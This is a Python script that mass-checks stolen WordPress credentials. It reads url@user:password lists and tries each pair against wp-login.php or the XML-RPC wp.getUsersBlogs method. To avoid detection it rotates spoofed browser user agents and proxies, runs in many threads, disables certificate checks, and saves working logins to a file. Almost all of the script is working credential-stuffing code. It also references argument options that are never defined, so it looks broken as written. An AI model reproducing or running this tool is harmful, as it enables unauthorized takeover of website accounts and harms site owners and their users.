import argparse
import os.path
import socket
import sys
from random import choice
from re import findall
from threading import Thread
from time import sleep
from urllib.parse import urlencode, quote_plus
import requests
# Uncomment this for huge lists (also at 172 and 195 lines)
# from threading import Lock

proxy = None

user_agents = (
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/7.0.5 Safari/537.77.4',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:31.0) Gecko/20100101 Firefox/31.0',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:30.0) Gecko/20100101 Firefox/30.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53',
    'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
    'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:30.0) Gecko/20100101 Firefox/30.0',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.76.4 (KHTML, like Gecko) Version/7.0.4 Safari/537.76.4',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/7.0.6 Safari/537.78.2',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/538.46 (KHTML, like Gecko) Version/8.0 Safari/538.46',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; rv:30.0) Gecko/20100101 Firefox/30.0',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10',
    'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/6.1.5 Safari/537.77.4',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/34.0.1847.116 Chrome/34.0.1847.116 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/6.1.5 Safari/537.77.4',
    'Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0',
    'Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14',
    'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D167 Safari/9537.53',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.74.9 (KHTML, like Gecko) Version/7.0.2 Safari/537.74.9',
    'Mozilla/5.0 (X11; Linux x86_64; rv:30.0) Gecko/20100101 Firefox/30.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:31.0) Gecko/20100101 Firefox/31.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0',
    'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:31.0) Gecko/20100101 Firefox/31.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
    'Mozilla/5.0 (Windows NT 5.1; rv:30.0) Gecko/20100101 Firefox/30.0',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0',
    'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) GSA/4.1.0.31802 Mobile/11D257 Safari/9537.53',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:31.0) Gecko/20100101 Firefox/31.0',
    'Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0',
    'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/36.0.1985.125 Chrome/36.0.1985.125 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:30.0) Gecko/20100101 Firefox/30.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Safari/600.1.3',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36'
)

UA = choice(user_agents)


def url_CMS(url, brutemode):
    """URL preparation"""
    if url[:8] != "https://" and url[:7] != "http://":
        print('\n[X] You must insert http:// or https:// procotol')
    if brutemode == "std":
        if '/wp-login.php' not in url:
            url += '/wp-login.php'
    else:
        if '/wp-login.php' in url:
            url = url.replace('/wp-login.php', '/xmlrpc.php')
    return url


def body_CMS(username, pwd, brutemode):
    """Payload for both modes"""
    if brutemode == "std":
        body = {
            'log': username,
            'pwd': pwd,
            'wp-submit': 'Login',
            'testcookie': '1'
        }
    else:
        body = f"""<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>wp.getUsersBlogs</methodName><params
        ><param><value>{username}</value></param><param><value>{pwd}</value></param></params></methodCall>"""
    return body


def headers_CMS(UA, cont_length, brutemode):
    """Headers depending on mode"""
    if brutemode == "std":
        headers = {
            'User-Agent': UA,
            'Content-type': 'application/x-www-form-urlencoded',
            'Cookie': 'wordpress_test_cookie=WP+Cookie+check'
        }
    else:
        headers = {
            'User-Agent': UA,
            'Content-type': 'text/xml',
            'Content-Length': f'{len(cont_length)}'
        }
    return headers


def proxy_CMS():
    """Grabbing proxies"""
    with open(pfile) as p:
        x = choice(p.readlines()).strip()
        proxy_dict = {
            "http": x,
            "https": x
        }
        return proxy_dict


def brute(url, user, password, UA, timeout, brutemode, ip):
    """Main Checker func"""
    username = user
    pwd = password
    body = body_CMS(username, pwd, brutemode)
    headers = headers_CMS(UA, body, brutemode)

    if brutemode == "std":
        http = requests.post(url, headers=headers, data=urlencode(body, quote_via=quote_plus),
                             allow_redirects=False, proxies=ip, timeout=timeout, verify=False)

        if str(http.status_code)[0] == "4" or str(http.status_code)[0] == "5":
            print('[X] HTTP error, code: ' + str(http.status_code), flush=True)
        elif str(http.status_code) == "302" and 'httponly' in http.headers['Set-Cookie'].lower():
            print('\n[!] Password is VALID!!!: ' + url + ' Username: ' + user + ' Password: ' + password, flush=True)
            # Uncomment this for huge lists
            # lock = Lock.acquire(blocking=True, timeout=-1)
            # with lock:
            with open(ofile, 'a') as output:
                output.write(f'{url}@{user}:{password}' + '\r\n')
        else:
            print('\n[X] Password is NOT valid :( ' + url + ' Username: ' + user + ' Password: ' + password,
                  flush=True)

        return 'OK'

    else:
        http = requests.post(url, headers=headers, data=body, allow_redirects=False, proxies=ip,
                             timeout=timeout, verify=False)

        if str(http.status_code)[0] == "4" or str(http.status_code)[0] == "5":
            print('[X] HTTP error, code: ' + str(http.status_code), flush=True)

        # Remove all blank and newline chars
        xmlcontent = http.text.replace(" ", "").replace("\n", "")

        if 'faultCode' not in xmlcontent:
            print('[!] Password is VALID!!!: ' + url + ' Username: ' + user + ' Password: ' + password, flush=True)
            # Uncomment this for huge lists
            # lock = Lock.acquire(blocking=True, timeout=-1)
            # with lock:
            with open(ofile, 'a') as output:
                output.write(f'{url}@{user}:{password}' + '\r\n')

        return 'OK'


def connection(url, user, password, UA, timeout, brutemode, retry, ip=proxy):
    """Main connection check and checker init"""
    total = 0
    while total < retry:
        try:
            if ip is not None:
                ip = proxy_CMS()
            http = requests.get(url, proxies=ip, timeout=timeout, verify=False)
            if http.status_code == 200:
                print('[+] Connection established')
                return brute(url, user, password, UA, timeout, brutemode, ip)
            else:
                print('[X] Connection Failure')
                total += 1
        except socket.timeout:
            print('\n[X] Connection Timeout!!')
            total += 1
        except socket.error:
            print('\n[X] Connection Refused!!')
            total += 1
        except requests.exceptions.ProxyError:
            print('\n[X] Bad Proxy!!')
            total += 1
        except requests.exceptions.TooManyRedirects:
            print('\n[X] Too Many Redirects!!')
            total += 1
        except requests.exceptions.ConnectionError:
            print('\n[X] Connection Error!!')
            total += 1
        except requests.exceptions.HTTPError:
            print('\n[X] HTTP Error!!')
            total += 1


def blocks(files, size=65536):
    """Line counter"""
    while True:
        b = files.read(size)
        if not b:
            break
        yield b


commandList = argparse.ArgumentParser(sys.argv[0])
commandList.add_argument('-S', '--standard',
                         action="store_true",
                         dest="standard",
                         help="Standard login check",
                         )
commandList.add_argument('-X', '--xml-rpc',
                         action="store_true",
                         dest="xml",
                         help="Xml-rpc login check",
                         )
commandList.add_argument('-i', '--input-file',
                         action="store",
                         dest="inputfile",
                         help="Insert input file",
                         )
commandList.add_argument('-o', '--output-file',
                         action="store",
                         dest="outputfile",
                         help="Insert output file",
                         )
commandList.add_argument('-p', '--proxy-list-file',
                         action="store",
                         dest="proxyfile",
                         help="Insert proxy list file",
                         )
commandList.add_argument('--timeout',
                         action="store",
                         dest="timeout",
                         default=9,
                         type=int,
                         help="Timeout Value (Default 10s)",
                         )
commandList.add_argument('--retry',
                         action="store",
                         dest="retry",
                         default=2,
                         type=int,
                         help="Url availability threshold",
                         )

options = commandList.parse_args()

# Check bruteforce mode conflicts
if options.standard and options.xml:
    print("\n[X] Select standard [-S] OR xml-rpc [-X] bruteforce mode")
    sys.exit(1)

# Check args
if not options.standard and not options.xml:
    commandList.print_help()
    sys.exit(1)
elif not options.inputfile:
    commandList.print_help()
    sys.exit(1)
elif not options.adminsfile and not options.usersfile:
    commandList.print_help()
    sys.exit(1)

# Set bruteforce mode
if options.standard:
    brtmd = "std"
else:
    brtmd = "xml"

# Args to vars
rfile = options.inputfile
ofile = options.outputfile
pfile = options.proxyfile
timeout = options.timeout
retry = options.retry

# Check if input file exists and is readable
if not os.path.isfile(rfile) and not os.access(rfile, os.R_OK):
    print("[X] Input file is missing or is not readable")
    sys.exit(1)

# Check if output file exists and is readable
if not os.path.isfile(ofile) and not os.access(ofile, os.R_OK):
    print("[X] Users output file is missing or is not readable")
    sys.exit(1)

# Check if proxy-list is present and file is readable
if pfile:
    if not os.access(pfile, os.R_OK):
        print("[X] Proxy file is not readable")
        sys.exit(1)
    elif os.stat(pfile).st_size == 0:
        print("[X] Proxy file is empty")
        sys.exit(1)
    else:
        proxy = True

count = 0
threads = []


with open(rfile) as wordlist:
    for line in wordlist:
        line = line.strip()
        try:
            url, user, pwd = line.split('@')[0], findall(r'@(.*):', line)[0], findall(r'^.*:(.*)$', line)[0]
        except IndexError:
            continue

        url = url_CMS(url, brtmd)

        wlsize = os.path.getsize(rfile) >> 20
        if wlsize <= 20000:
            with open(rfile) as f:
                total_wordlist = sum(bl.count("\n") for bl in blocks(f))
        else:
            total_wordlist = "unknown"

        print('\n\n[+] Target.....: ' + str(url))
        print('[+] Username...: ' + user)
        print('[+] Password...: ' + pwd)
        if brtmd == "std":
            print('[+] BruteMode..: Standard')
        else:
            print('[+] BruteMode..: Xml-Rpc')
        print('[+]')
        print('[+] Connecting.......')
        print('[+]')

        count += 1
        t = Thread(target=connection, args=(url, user, pwd, UA, timeout, brtmd, retry, proxy))
        t.start()
        threads.append(t)
        sys.stdout.write('\r')
        sys.stdout.write('[+] Target checked: ' + str(count) + '/' + str(total_wordlist))
        sys.stdout.flush()
        sleep(0.210)

for a in threads:
    a.join()
